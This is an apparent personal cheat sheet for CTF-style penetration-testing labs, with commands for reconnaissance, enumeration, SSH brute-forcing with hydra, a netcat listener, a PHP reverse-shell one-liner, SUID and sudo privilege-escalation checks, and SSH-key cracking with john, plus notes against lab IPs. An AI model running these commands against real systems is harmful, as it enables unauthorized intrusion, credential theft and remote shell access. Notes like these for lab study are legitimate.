## Reconnaissance
- command, tool
  - whois
  - nslookup
  - theHarvester
  - Sublist3r

## Enumeration
- nmap -sV -O <target>
- gobuster dir -u http://<target> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http
- smbclient //<target>/anonymous -N
- ftp -n <target>
- command, tool
  - nmap
  - gobuster、nikto
  - nikto
  - wpscan
  - CyberChef


## Exploitation
- hydra -l user -P /usr/share/wordlists/rockyou.txt -f -o found.txt ssh://<target>
- searchsploit vsftpd 2.3.4
- searchsploit -x exploit/unix/remote/17491.txt
- nc -lvnp 12345
- php -r '$sock=fsockopen("<target>",12345);exec("/bin/sh -i <&3 >&3 2>&3");'
- command, tool
  - Metasploit Framework
  - BurpSuite
  - searchsploit,exploit-db
  - hydra


## Privilege Escalation
- id
- python3 -c 'import pty; pty.spawn("/bin/bash")’
- sudo -l
- find / -group $(id -gn) -perm -g=x -type f 2>/dev/null
- find / -user root -perm -u=s -type f 2>/dev/null
- python3 ssh2john.py id_rsa > id_rsa_hash.txt
- john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash.txt
- command, tool
  - linpeas
  - pspy
  - sudo -l
  - GTFOBins
  - searchsploit,exploit-db


## ローカルのメモ
- sudo nmap -sV -O 10.10.251.27
- gobuster dir -u http://10.10.251.27 -w common.txt http
- lftp -u anonymous 10.10.104.75
- hydra -l jake -P rockyou.txt -f -o found.txt ssh://10.10.104.75
- ssh jake@10.10.104.75